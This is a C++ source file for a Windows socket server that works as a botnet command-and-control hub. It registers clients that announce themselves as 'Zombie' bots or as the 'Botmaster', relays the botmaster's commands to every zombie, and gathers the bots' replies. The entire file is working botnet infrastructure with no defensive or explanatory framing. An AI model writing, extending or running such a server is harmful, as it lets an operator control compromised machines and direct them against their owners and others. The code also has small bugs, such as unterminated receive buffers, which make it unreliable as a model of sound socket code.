#include "Server.h"

Server::Server(std::string ip, int port)
	: m_IpAddress(ip), m_Port(port)
{
}

bool Server::init()
{
	WSAData data;
	return !WSAStartup(MAKEWORD(2, 2), &data);
}

Server::~Server()
{
	cleanUp();
}

int Server::cleanUp()
{
	closesocket(m_Listening);
	for (SOCKET zombie : m_Zombies)
		closesocket(zombie);
	return WSACleanup();
}

bool Server::createListeningSocket()
{
	m_Listening = socket(AF_INET, SOCK_STREAM, 0);

	if (m_Listening != INVALID_SOCKET)
	{
		SOCKADDR_IN addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(m_Port);
		inet_pton(AF_INET, m_IpAddress.c_str(), &addr.sin_addr);

		int bindSocket = bind(m_Listening, (sockaddr*)&addr, sizeof(addr));
		if (bindSocket == SOCKET_ERROR)
		{
			std::cout << "Couldnt bind listening socket to address	Error code: " << WSAGetLastError() << std::endl;
			return false;
		}

		int listenSocket = listen(m_Listening, SOMAXCONN);
		if (listenSocket == SOCKET_ERROR)
		{
			std::cout << "Couldnt create listening socket	Error code: " << WSAGetLastError() << std::endl;
			return false;
		}

		std::cout << "Server listening..." << std::endl;
		return true;
	}
	else
	{
		std::cout << "Couldnt create socket	Error code: " << WSAGetLastError() << std::endl;
		return false;
	}
}

void Server::waiting()
{
	FD_ZERO(&m_Readfds);
	FD_SET(m_Listening, &m_Readfds);
	if(m_Botmaster != INVALID_SOCKET)	//Botmaster may not be logined
		FD_SET(m_Botmaster, &m_Readfds);

	SOCKET maxSd = m_Botmaster > m_Listening ? m_Botmaster : m_Listening;

	for (SOCKET zombie : m_Zombies)
	{
		FD_SET(zombie, &m_Readfds);		//already checked in acceptConnection() that its a valid socket
		maxSd = zombie > maxSd ? zombie : maxSd;
	}

	m_RdySocket = select(maxSd + 1, &m_Readfds, NULL, NULL, NULL);	//first parameter range in which he checks all sockets
}

int Server::acceptConnection()
{
	if (FD_ISSET(m_Listening, &m_Readfds))
	{
		SOCKET m_Client = accept(m_Listening, nullptr, nullptr);
		if (m_Client == INVALID_SOCKET)
			return WEIRDO;
		else
		{
			char buf[4096];
			if (recv(m_Client, buf, sizeof(buf), 0))
			{
				std::string tmp = buf;
				if (tmp.substr(0, 6) == "Zombie")
				{
					m_Zombies.push_back(m_Client);
					return ZOMBIE;
				}
				else if (tmp.substr(0, 9) == "Botmaster" && m_Botmaster == INVALID_SOCKET)
				{
					m_Botmaster = m_Client;
					return BOTMASTER;
				}
				else
				{
					return WEIRDO;
				}
			}
			else {
				return WEIRDO;	//todo endless loop stops server from doing things
			}
		}
	}
	return -1;
}

void Server::sendToZombies(const std::string& msg)
{
	for (SOCKET zombie : m_Zombies)
		sendToZombie(zombie, msg);
}

bool Server::sendToZombie(SOCKET zombie, const std::string& msg)
{
	int sended = send(zombie, msg.c_str(), msg.size(), 0);
	if (sended == SOCKET_ERROR)
		return false;
	return true;
}

bool Server::sendToBotmaster(const std::string& msg)
{
	int sended = send(m_Botmaster, msg.c_str(), msg.size(), 0);
	if (sended == SOCKET_ERROR)
		return false;
	return true;
}

bool Server::receive()
{
	bool rcvAnything = false;

	m_BotMasterBuf.clear();
	char botMasterBuf[4096];
	SecureZeroMemory(botMasterBuf, sizeof(botMasterBuf));
	if (FD_ISSET(m_Botmaster, &m_Readfds))
	{
		int received = recv(m_Botmaster, botMasterBuf, sizeof(botMasterBuf), 0);
		if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
		{
			closesocket(m_Botmaster);
			m_Botmaster = INVALID_SOCKET;
		}
		else
		{
			m_BotMasterBuf = botMasterBuf;
		}
		rcvAnything = true;
	}

	m_BotBufs.clear();
	for (int i = 0; i < m_Zombies.size(); i ++)
	{
		char botBuf[4096];
		SecureZeroMemory(botBuf, sizeof(botMasterBuf));
		if (FD_ISSET(m_Zombies[i], &m_Readfds))
		{
			int received = recv(m_Zombies[i], botBuf, sizeof(botBuf), 0);
			if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
			{
				closesocket(m_Zombies[i]);
				m_Zombies.erase(m_Zombies.begin() + i);
			}
			else
			{
				m_BotBufs.push_back(std::pair<SOCKET, std::string>(m_Zombies[i], botBuf));
			}
			rcvAnything = true;
		}
	}
	return rcvAnything;
}

std::string Server::getBotMasterMessage()
{
	return m_BotMasterBuf;
}

std::vector<std::string> Server::getBotMessages()
{
	std::vector<std::string> msgs;
	for(auto msg : m_BotBufs)
		msgs.push_back(msg.second);
	return msgs;
}
